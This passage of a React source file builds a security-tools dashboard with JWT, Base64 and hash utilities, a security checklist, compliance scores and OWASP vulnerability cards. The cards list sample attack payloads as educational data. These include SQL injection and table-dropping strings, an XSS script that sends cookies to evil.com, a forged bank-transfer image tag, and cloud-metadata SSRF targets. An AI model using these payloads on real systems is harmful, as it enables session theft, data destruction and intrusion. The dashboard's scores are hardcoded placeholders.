              <span className="text-white/80"><strong>Scope:</strong> Permissions requested by the application</span>
            </div>
            <div className="flex items-start gap-2">
              <span className="text-rose-gold-400">-</span>
              <span className="text-white/80"><strong>PKCE:</strong> Proof Key for Code Exchange (prevents interception)</span>
            </div>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-6">
        {/* JWT Decoder */}
        <div className="morphic-card p-6 rounded-xl">
          <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <FileText className="w-5 h-5 text-rose-gold-400" />
            JWT Decoder
          </h3>

          <div className="space-y-4">
            <textarea
              value={jwtInput}
              onChange={(e) => setJwtInput(e.target.value)}
              placeholder="Paste your JWT token here..."
              className="w-full h-24 bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-white text-xs font-mono placeholder-white/30 resize-none"
            />

            <button
              onClick={handleDecodeJWT}
              className="w-full morphic-btn py-2.5 text-sm font-medium"
            >
              Decode JWT
            </button>

            {jwtError && (
              <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-red-400 text-xs">
                {jwtError}
              </div>
            )}

            {jwtDecoded && (
              <div className="space-y-3">
                <div className="p-3 rounded-lg bg-white/5 border border-white/10">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs text-white/60">Header</span>
                    <button
                      onClick={() => copyToClipboard(JSON.stringify(jwtDecoded.header, null, 2), 'jwt-header')}
                      className="text-white/40 hover:text-white"
                    >
                      {copiedItem === 'jwt-header' ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                    </button>
                  </div>
                  <pre className="text-xs text-rose-gold-400 font-mono overflow-x-auto">
                    {JSON.stringify(jwtDecoded.header, null, 2)}
                  </pre>
                </div>

                <div className="p-3 rounded-lg bg-white/5 border border-white/10">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs text-white/60">Payload</span>
                    <button
                      onClick={() => copyToClipboard(JSON.stringify(jwtDecoded.payload, null, 2), 'jwt-payload')}
                      className="text-white/40 hover:text-white"
                    >
                      {copiedItem === 'jwt-payload' ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                    </button>
                  </div>
                  <pre className="text-xs text-rose-gold-400 font-mono overflow-x-auto max-h-32">
                    {JSON.stringify(jwtDecoded.payload, null, 2)}
                  </pre>
                </div>

                <div className="flex items-center gap-4 text-xs">
                  {jwtDecoded.issuedAt && (
                    <div className="flex items-center gap-1 text-white/60">
                      <Clock className="w-3 h-3" />
                      Issued: {jwtDecoded.issuedAt}
                    </div>
                  )}
                  {jwtDecoded.expiresAt && (
                    <div className={`flex items-center gap-1 ${jwtDecoded.isExpired ? 'text-red-400' : 'text-green-400'}`}>
                      <AlertCircle className="w-3 h-3" />
                      {jwtDecoded.isExpired ? 'Expired' : 'Expires'}: {jwtDecoded.expiresAt}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Base64 Encoder/Decoder */}
        <div className="morphic-card p-6 rounded-xl">
          <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Code className="w-5 h-5 text-rose-gold-400" />
            Base64 Encoder/Decoder
          </h3>

          <div className="space-y-4">
            <div className="flex gap-2">
              <button
                onClick={() => setBase64Mode('encode')}
                className={`flex-1 py-2 rounded-lg text-sm transition-colors ${
                  base64Mode === 'encode'
                    ? 'bg-rose-gold-400/20 text-rose-gold-400 border border-rose-gold-400/30'
                    : 'bg-white/5 text-white/60 hover:text-white'
                }`}
              >
                Encode
              </button>
              <button
                onClick={() => setBase64Mode('decode')}
                className={`flex-1 py-2 rounded-lg text-sm transition-colors ${
                  base64Mode === 'decode'
                    ? 'bg-rose-gold-400/20 text-rose-gold-400 border border-rose-gold-400/30'
                    : 'bg-white/5 text-white/60 hover:text-white'
                }`}
              >
                Decode
              </button>
            </div>

            <textarea
              value={base64Input}
              onChange={(e) => setBase64Input(e.target.value)}
              placeholder={base64Mode === 'encode' ? 'Enter text to encode...' : 'Enter Base64 to decode...'}
              className="w-full h-20 bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-white text-sm font-mono placeholder-white/30 resize-none"
            />

            <button
              onClick={handleBase64}
              className="w-full morphic-btn py-2.5 text-sm font-medium"
            >
              {base64Mode === 'encode' ? 'Encode to Base64' : 'Decode from Base64'}
            </button>

            {base64Output && (
              <div className="relative">
                <textarea
                  value={base64Output}
                  readOnly
                  className="w-full h-20 bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-rose-gold-400 text-sm font-mono resize-none"
                />
                <button
                  onClick={() => copyToClipboard(base64Output, 'base64')}
                  className="absolute top-2 right-2 p-1.5 text-white/40 hover:text-white"
                >
                  {copiedItem === 'base64' ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Hash Generator */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Hash className="w-5 h-5 text-rose-gold-400" />
          Hash Generator
        </h3>

        <div className="grid grid-cols-2 gap-6">
          <div className="space-y-4">
            <div>
              <label className="text-xs text-white/60 mb-2 block">Input Text</label>
              <textarea
                value={hashInput}
                onChange={(e) => setHashInput(e.target.value)}
                placeholder="Enter text to hash..."
                className="w-full h-24 bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-white text-sm placeholder-white/30 resize-none"
              />
            </div>

            <div>
              <label className="text-xs text-white/60 mb-2 block">Algorithm</label>
              <div className="flex gap-2">
                {(['MD5', 'SHA-1', 'SHA-256', 'SHA-512'] as const).map(algo => (
                  <button
                    key={algo}
                    onClick={() => setHashAlgorithm(algo)}
                    className={`flex-1 py-2 rounded-lg text-xs transition-colors ${
                      hashAlgorithm === algo
                        ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30'
                        : 'bg-white/5 text-white/60 hover:text-white'
                    }`}
                  >
                    {algo}
                  </button>
                ))}
              </div>
            </div>

            <button
              onClick={handleGenerateHash}
              className="w-full morphic-btn bg-rose-gold-400/20 text-rose-gold-400 border-rose-gold-400/30 hover:bg-rose-gold-400/30 py-2.5 text-sm font-medium"
            >
              Generate Hash
            </button>
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-xs text-white/60 mb-2 block">Output Hash ({hashAlgorithm})</label>
              <div className="relative">
                <textarea
                  value={hashOutput}
                  readOnly
                  placeholder="Hash will appear here..."
                  className="w-full h-24 bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-rose-gold-400 text-xs font-mono placeholder-white/30 resize-none"
                />
                {hashOutput && (
                  <button
                    onClick={() => copyToClipboard(hashOutput, 'hash')}
                    className="absolute top-2 right-2 p-1.5 text-white/40 hover:text-white"
                  >
                    {copiedItem === 'hash' ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                  </button>
                )}
              </div>
            </div>

            <div className="p-3 rounded-lg bg-white/5 border border-white/10">
              <p className="text-xs text-white/60">
                <strong className="text-white">Note:</strong> MD5 and SHA-1 are considered cryptographically weak.
                Use SHA-256 or SHA-512 for security-sensitive applications.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

// ============== Security Best Practices Tab ==============

function SecurityBestPractices() {
  const [expandedVuln, setExpandedVuln] = useState<string | null>(null)
  const [checklist, setChecklist] = useState<SecurityCheckItem[]>([
    { id: '1', category: 'Authentication', title: 'Implement strong password policies', description: 'Minimum 12 characters, mix of types, no common patterns', severity: 'critical', checked: false },
    { id: '2', category: 'Authentication', title: 'Enable multi-factor authentication', description: 'Require 2FA for all user accounts, especially admin', severity: 'critical', checked: false },
    { id: '3', category: 'Authentication', title: 'Use secure session management', description: 'Implement proper session timeouts and regeneration', severity: 'high', checked: false },
    { id: '4', category: 'Data Protection', title: 'Encrypt data at rest', description: 'Use AES-256 or equivalent for stored sensitive data', severity: 'critical', checked: false },
    { id: '5', category: 'Data Protection', title: 'Encrypt data in transit', description: 'Use TLS 1.3 for all communications', severity: 'critical', checked: false },
    { id: '6', category: 'Data Protection', title: 'Implement input validation', description: 'Validate and sanitize all user inputs', severity: 'high', checked: false },
    { id: '7', category: 'Infrastructure', title: 'Keep dependencies updated', description: 'Regularly update all packages and libraries', severity: 'high', checked: false },
    { id: '8', category: 'Infrastructure', title: 'Configure security headers', description: 'CSP, HSTS, X-Frame-Options, etc.', severity: 'medium', checked: false },
    { id: '9', category: 'Infrastructure', title: 'Implement rate limiting', description: 'Protect against brute force and DoS attacks', severity: 'high', checked: false },
    { id: '10', category: 'Monitoring', title: 'Enable security logging', description: 'Log authentication events, errors, and suspicious activity', severity: 'high', checked: false },
    { id: '11', category: 'Monitoring', title: 'Set up security alerts', description: 'Automated notifications for security events', severity: 'medium', checked: false },
    { id: '12', category: 'API Security', title: 'Implement API authentication', description: 'Use OAuth 2.0 or API keys with proper rotation', severity: 'critical', checked: false },
  ])

  const vulnerabilities: VulnerabilityInfo[] = [
    {
      id: 'sqli',
      name: 'SQL Injection',
      severity: 'critical',
      description: 'Attackers inject malicious SQL code through user inputs to manipulate database queries.',
      prevention: [
        'Use parameterized queries or prepared statements',
        'Implement input validation and sanitization',
        'Use ORM frameworks that handle escaping',
        'Apply principle of least privilege to database accounts'
      ],
      examples: [
        "SELECT * FROM users WHERE id = '1' OR '1'='1'",
        "'; DROP TABLE users; --"
      ]
    },
    {
      id: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      severity: 'high',
      description: 'Attackers inject client-side scripts into web pages viewed by other users.',
      prevention: [
        'Encode output based on context (HTML, JavaScript, URL)',
        'Use Content Security Policy (CSP) headers',
        'Validate and sanitize all user inputs',
        'Use modern frameworks with auto-escaping'
      ],
      examples: [
        '<script>document.location="http://evil.com?c="+document.cookie</script>',
        '<img src=x onerror="alert(1)">'
      ]
    },
    {
      id: 'csrf',
      name: 'Cross-Site Request Forgery (CSRF)',
      severity: 'high',
      description: 'Attackers trick users into executing unwanted actions on authenticated web applications.',
      prevention: [
        'Implement anti-CSRF tokens',
        'Use SameSite cookie attribute',
        'Verify Origin and Referer headers',
        'Require re-authentication for sensitive actions'
      ],
      examples: [
        '<img src="https://bank.com/transfer?to=attacker&amount=10000">',
        'Hidden form auto-submission'
      ]
    },
    {
      id: 'broken-auth',
      name: 'Broken Authentication',
      severity: 'critical',
      description: 'Weaknesses in authentication mechanisms allow attackers to compromise passwords, keys, or session tokens.',
      prevention: [
        'Implement multi-factor authentication',
        'Use secure password storage (bcrypt, Argon2)',
        'Implement account lockout after failed attempts',
        'Use secure session management'
      ],
      examples: [
        'Credential stuffing attacks',
        'Session fixation',
        'Predictable session IDs'
      ]
    },
    {
      id: 'ssrf',
      name: 'Server-Side Request Forgery (SSRF)',
      severity: 'high',
      description: 'Attackers abuse server functionality to access internal resources or services.',
      prevention: [
        'Validate and sanitize all user-supplied URLs',
        'Implement allowlists for permitted domains',
        'Disable unused URL schemas',
        'Use network segmentation'
      ],
      examples: [
        'http://localhost/admin',
        'http://169.254.169.254/metadata (cloud metadata)'
      ]
    }
  ]

  const toggleCheck = (id: string) => {
    setChecklist(prev => prev.map(item =>
      item.id === id ? { ...item, checked: !item.checked } : item
    ))
  }

  const getSeverityColor = (severity: string) => {
    const colors: Record<string, string> = {
      critical: 'text-red-400 bg-red-500/20 border-red-500/30',
      high: 'text-orange-400 bg-orange-500/20 border-orange-500/30',
      medium: 'text-yellow-400 bg-yellow-500/20 border-yellow-500/30',
      low: 'text-blue-400 bg-blue-500/20 border-blue-500/30'
    }
    return colors[severity] || colors.medium
  }

  const completedCount = checklist.filter(i => i.checked).length
  const progress = (completedCount / checklist.length) * 100

  const categories = [...new Set(checklist.map(i => i.category))]

  return (
    <div className="space-y-6">
      {/* Security Checklist */}
      <div className="morphic-card p-6 rounded-xl">
        <div className="flex items-center justify-between mb-6">
          <h3 className="text-lg font-semibold text-white flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 text-rose-gold-400" />
            Application Security Checklist
          </h3>
          <div className="flex items-center gap-3">
            <span className="text-sm text-white/60">{completedCount}/{checklist.length} complete</span>
            <div className="w-32 h-2 bg-white/10 rounded-full overflow-hidden">
              <div
                className="h-full bg-rose-gold-400 rounded-full transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-6">
          {categories.map(category => (
            <div key={category}>
              <h4 className="text-sm font-medium text-white/60 mb-3">{category}</h4>
              <div className="space-y-2">
                {checklist.filter(i => i.category === category).map(item => (
                  <label
                    key={item.id}
                    className={`flex items-start gap-3 p-3 rounded-lg cursor-pointer transition-colors ${
                      item.checked ? 'bg-rose-gold-400/10' : 'bg-white/5 hover:bg-white/10'
                    }`}
                  >
                    <input
                      type="checkbox"
                      checked={item.checked}
                      onChange={() => toggleCheck(item.id)}
                      className="mt-0.5 rounded border-white/20 bg-white/5 text-rose-gold-400 focus:ring-rose-gold-400/50"
                    />
                    <div className="flex-1">
                      <div className="flex items-center gap-2">
                        <p className={`text-sm ${item.checked ? 'text-rose-gold-400 line-through' : 'text-white'}`}>
                          {item.title}
                        </p>
                        <span className={`text-[10px] px-1.5 py-0.5 rounded border ${getSeverityColor(item.severity)}`}>
                          {item.severity}
                        </span>
                      </div>
                      <p className="text-xs text-white/40 mt-1">{item.description}</p>
                    </div>
                  </label>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Common Vulnerabilities */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Bug className="w-5 h-5 text-rose-gold-400" />
          Common Vulnerabilities (OWASP Top 10)
        </h3>

        <div className="space-y-3">
          {vulnerabilities.map(vuln => (
            <div key={vuln.id} className="rounded-lg bg-white/5 border border-white/10 overflow-hidden">
              <button
                onClick={() => setExpandedVuln(expandedVuln === vuln.id ? null : vuln.id)}
                className="w-full flex items-center justify-between p-4 hover:bg-white/5 transition-colors"
              >
                <div className="flex items-center gap-3">
                  <span className={`text-xs px-2 py-0.5 rounded border ${getSeverityColor(vuln.severity)}`}>
                    {vuln.severity}
                  </span>
                  <span className="font-medium text-white">{vuln.name}</span>
                </div>
                {expandedVuln === vuln.id ? (
                  <ChevronDown className="w-4 h-4 text-white/40" />
                ) : (
                  <ChevronRight className="w-4 h-4 text-white/40" />
                )}
              </button>

              {expandedVuln === vuln.id && (
                <div className="px-4 pb-4 border-t border-white/10">
                  <p className="text-sm text-white/80 mt-3 mb-4">{vuln.description}</p>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <h5 className="text-xs font-medium text-green-400 mb-2 flex items-center gap-1">
                        <ShieldCheck className="w-3 h-3" />
                        Prevention
                      </h5>
                      <ul className="space-y-1">
                        {vuln.prevention.map((item, i) => (
                          <li key={i} className="text-xs text-white/60 flex items-start gap-2">
                            <span className="text-green-400 mt-0.5">-</span>
                            {item}
                          </li>
                        ))}
                      </ul>
                    </div>

                    <div>
                      <h5 className="text-xs font-medium text-red-400 mb-2 flex items-center gap-1">
                        <AlertOctagon className="w-3 h-3" />
                        Attack Examples
                      </h5>
                      <ul className="space-y-1">
                        {vuln.examples.map((example, i) => (
                          <li key={i} className="text-xs text-white/60 font-mono bg-white/5 px-2 py-1 rounded">
                            {example}
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      </div>

      {/* Secure Coding Guidelines */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <BookOpen className="w-5 h-5 text-rose-gold-400" />
          Secure Coding Guidelines
        </h3>

        <div className="grid grid-cols-3 gap-4">
          <div className="p-4 rounded-lg bg-white/5 border border-white/10">
            <h4 className="font-medium text-white mb-2 flex items-center gap-2">
              <Database className="w-4 h-4 text-rose-gold-400" />
              Data Handling
            </h4>
            <ul className="space-y-1 text-xs text-white/60">
              <li>- Never store passwords in plain text</li>
              <li>- Use strong encryption (AES-256)</li>
              <li>- Sanitize all user inputs</li>
              <li>- Implement proper error handling</li>
              <li>- Avoid exposing sensitive data in logs</li>
            </ul>
          </div>

          <div className="p-4 rounded-lg bg-white/5 border border-white/10">
            <h4 className="font-medium text-white mb-2 flex items-center gap-2">
              <Key className="w-4 h-4 text-rose-gold-400" />
              Authentication
            </h4>
            <ul className="space-y-1 text-xs text-white/60">
              <li>- Use bcrypt/Argon2 for password hashing</li>
              <li>- Implement account lockout policies</li>
              <li>- Use secure session tokens</li>
              <li>- Implement proper logout functionality</li>
              <li>- Enforce strong password policies</li>
            </ul>
          </div>

          <div className="p-4 rounded-lg bg-white/5 border border-white/10">
            <h4 className="font-medium text-white mb-2 flex items-center gap-2">
              <Server className="w-4 h-4 text-rose-gold-400" />
              API Security
            </h4>
            <ul className="space-y-1 text-xs text-white/60">
              <li>- Use HTTPS for all endpoints</li>
              <li>- Implement rate limiting</li>
              <li>- Validate content types</li>
              <li>- Use proper HTTP methods</li>
              <li>- Implement request authentication</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  )
}

// ============== Trust Metrics Dashboard Tab ==============

function TrustMetricsDashboard() {
  const [metrics] = useState({
    trustScore: 85,
    authStatus: 'Strong',
    complianceScore: 78,
    securityEvents: 3,
    lastAudit: '2024-01-15'
  })

  const [recentEvents] = useState([
    { id: 1, type: 'success', message: 'Security scan completed', time: '2 hours ago' },
    { id: 2, type: 'warning', message: 'Unusual login attempt detected', time: '5 hours ago' },
    { id: 3, type: 'info', message: 'Password policy updated', time: '1 day ago' },
    { id: 4, type: 'success', message: 'SSL certificate renewed', time: '3 days ago' },
    { id: 5, type: 'warning', message: 'Outdated dependency detected', time: '1 week ago' },
  ])

  const complianceItems = [
    { name: 'GDPR', status: 'compliant', score: 92 },
    { name: 'SOC 2', status: 'partial', score: 75 },
    { name: 'HIPAA', status: 'partial', score: 68 },
    { name: 'PCI DSS', status: 'compliant', score: 88 },
    { name: 'ISO 27001', status: 'review', score: 55 },
  ]

  const getScoreColor = (score: number) => {
    if (score >= 80) return 'text-green-400'
    if (score >= 60) return 'text-yellow-400'
    return 'text-red-400'
  }

  const getStatusColor = (status: string) => {
    const colors: Record<string, string> = {
      compliant: 'bg-green-500/20 text-green-400 border-green-500/30',
      partial: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
      review: 'bg-orange-500/20 text-orange-400 border-orange-500/30',
      'non-compliant': 'bg-red-500/20 text-red-400 border-red-500/30'
    }
    return colors[status] || colors.review
  }

  const getEventIcon = (type: string) => {
    switch (type) {
      case 'success': return <CheckCircle2 className="w-4 h-4 text-green-400" />
      case 'warning': return <AlertTriangle className="w-4 h-4 text-yellow-400" />
      case 'error': return <AlertCircle className="w-4 h-4 text-red-400" />
      default: return <Info className="w-4 h-4 text-blue-400" />
    }
  }

  return (
    <div className="space-y-6">
      {/* Top Stats */}
      <div className="grid grid-cols-4 gap-4">
        <StatCard
          icon={Award}
          label="Platform Trust Score"
          value={`${metrics.trustScore}/100`}
          trend="+5%"
          color="rose"
        />
        <StatCard
          icon={ShieldCheck}
          label="Authentication Status"
          value={metrics.authStatus}
          color="green"
        />
        <StatCard
          icon={FileText}
          label="Compliance Score"
          value={`${metrics.complianceScore}%`}
          color="rose"
        />
        <StatCard
          icon={Activity}
          label="Security Events"
          value={metrics.securityEvents}
          trend="This week"
          color="yellow"
        />
      </div>

      <div className="grid grid-cols-2 gap-6">
        {/* Trust Score Breakdown */}
        <div className="morphic-card p-6 rounded-xl">
          <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Award className="w-5 h-5 text-rose-gold-400" />
            Trust Score Breakdown
          </h3>

          <div className="flex items-center justify-center mb-6">
            <div className="relative w-40 h-40">
              <svg className="w-full h-full transform -rotate-90">
                <circle
                  cx="80"
                  cy="80"
                  r="70"
                  stroke="currentColor"
                  strokeWidth="12"
                  fill="none"
                  className="text-white/10"
                />
                <circle
                  cx="80"
                  cy="80"
                  r="70"
                  stroke="currentColor"
                  strokeWidth="12"
                  fill="none"
                  strokeDasharray={`${metrics.trustScore * 4.4} 440`}
                  className="text-rose-gold-400 transition-all duration-1000"
                  strokeLinecap="round"
                />
              </svg>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="text-center">
                  <div className="text-4xl font-bold text-rose-gold-400">{metrics.trustScore}</div>
                  <div className="text-xs text-white/60">Trust Score</div>
                </div>
              </div>
            </div>
          </div>

          <div className="space-y-3">
            {[
              { label: 'Authentication', score: 92, color: 'bg-rose-gold-400' },
              { label: 'Data Protection', score: 85, color: 'bg-rose-gold-400' },
              { label: 'Access Control', score: 78, color: 'bg-rose-gold-400' },
              { label: 'Monitoring', score: 72, color: 'bg-rose-gold-400' },
            ].map(item => (
              <div key={item.label}>
                <div className="flex justify-between text-sm mb-1">
                  <span className="text-white/60">{item.label}</span>
                  <span className={getScoreColor(item.score)}>{item.score}%</span>
                </div>
                <div className="h-2 bg-white/10 rounded-full overflow-hidden">
                  <div
                    className={`h-full ${item.color} rounded-full transition-all duration-500`}
                    style={{ width: `${item.score}%` }}
                  />
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Compliance Status */}
        <div className="morphic-card p-6 rounded-xl">
          <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <FileText className="w-5 h-5 text-rose-gold-400" />
            Compliance Status
          </h3>

          <div className="space-y-3">
            {complianceItems.map(item => (
              <div
                key={item.name}
                className="flex items-center justify-between p-3 rounded-lg bg-white/5 border border-white/10"
              >
                <div className="flex items-center gap-3">
                  <span className="text-white font-medium">{item.name}</span>
                  <span className={`text-xs px-2 py-0.5 rounded border ${getStatusColor(item.status)}`}>
                    {item.status}
                  </span>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-24 h-2 bg-white/10 rounded-full overflow-hidden">
                    <div
                      className={`h-full rounded-full transition-all duration-500 ${
                        item.score >= 80 ? 'bg-green-500' :
                        item.score >= 60 ? 'bg-yellow-500' : 'bg-red-500'
                      }`}
                      style={{ width: `${item.score}%` }}
                    />
                  </div>
                  <span className={`text-sm font-medium ${getScoreColor(item.score)}`}>
                    {item.score}%
                  </span>
                </div>
              </div>
            ))}
          </div>

          <div className="mt-4 p-3 rounded-lg bg-white/5 border border-white/10">
            <div className="flex items-center gap-2 text-xs text-white/60">
              <Clock className="w-4 h-4" />
              Last compliance audit: {metrics.lastAudit}
            </div>
          </div>
        </div>
      </div>

      {/* Recent Security Events */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Activity className="w-5 h-5 text-rose-gold-400" />
          Recent Security Events
        </h3>

        <div className="space-y-2">
          {recentEvents.map(event => (
            <div
              key={event.id}
              className="flex items-center gap-4 p-3 rounded-lg bg-white/5 border border-white/10"
            >
              {getEventIcon(event.type)}
              <span className="flex-1 text-sm text-white">{event.message}</span>
              <span className="text-xs text-white/40">{event.time}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Authentication Status */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Lock className="w-5 h-5 text-rose-gold-400" />
          Authentication Status
        </h3>

        <div className="grid grid-cols-4 gap-4">
          <div className="p-4 rounded-lg bg-green-500/10 border border-green-500/30 text-center">
            <CheckCircle2 className="w-8 h-8 text-green-400 mx-auto mb-2" />
            <p className="text-sm text-white font-medium">MFA Enabled</p>
            <p className="text-xs text-white/60">All admin accounts</p>
          </div>

          <div className="p-4 rounded-lg bg-green-500/10 border border-green-500/30 text-center">
            <Lock className="w-8 h-8 text-green-400 mx-auto mb-2" />
            <p className="text-sm text-white font-medium">Strong Passwords</p>
            <p className="text-xs text-white/60">Policy enforced</p>
          </div>

          <div className="p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-center">
            <Key className="w-8 h-8 text-yellow-400 mx-auto mb-2" />
            <p className="text-sm text-white font-medium">API Keys</p>
            <p className="text-xs text-white/60">2 need rotation</p>
          </div>

          <div className="p-4 rounded-lg bg-green-500/10 border border-green-500/30 text-center">
            <Shield className="w-8 h-8 text-green-400 mx-auto mb-2" />
            <p className="text-sm text-white font-medium">OAuth 2.0</p>
            <p className="text-xs text-white/60">Properly configured</p>
          </div>
        </div>
      </div>
    </div>
  )
}

// ============== Main Component ==============

type TabType = 'verification' | 'authentication' | 'practices' | 'dashboard'

export default function TrustArchitectView() {
  const [activeTab, setActiveTab] = useState<TabType>('verification')

  return (
    <div className="h-full flex flex-col bg-dark-500 overflow-hidden">
      {/* Header */}
      <div className="glass-morphic-header p-4 border-b border-rose-gold-400/20">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-rose-gold-300 to-rose-gold-600 flex items-center justify-center shadow-glow-lg animate-pulse-glow">
              <Shield className="w-5 h-5 text-dark-500" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-white">Trust Architect</h2>
              <p className="text-xs text-rose-gold-400/70">Alabobai - Security verification and authentication tools</p>
            </div>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex items-center gap-2">
          <TabButton
            active={activeTab === 'verification'}
            onClick={() => setActiveTab('verification')}
            icon={BadgeCheck}
            label="Verification"
          />
          <TabButton
            active={activeTab === 'authentication'}
            onClick={() => setActiveTab('authentication')}
            icon={Key}
            label="Auth Tools"
          />
          <TabButton
            active={activeTab === 'practices'}
            onClick={() => setActiveTab('practices')}
            icon={BookOpen}
            label="Best Practices"
          />
          <TabButton
            active={activeTab === 'dashboard'}
            onClick={() => setActiveTab('dashboard')}
            icon={Activity}
            label="Trust Metrics"
          />
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto morphic-scrollbar p-6">
        {activeTab === 'verification' && <VerificationSystems />}
        {activeTab === 'authentication' && <AuthenticationTools />}
        {activeTab === 'practices' && <SecurityBestPractices />}
        {activeTab === 'dashboard' && <TrustMetricsDashboard />}
      </div>
    </div>
  )
}
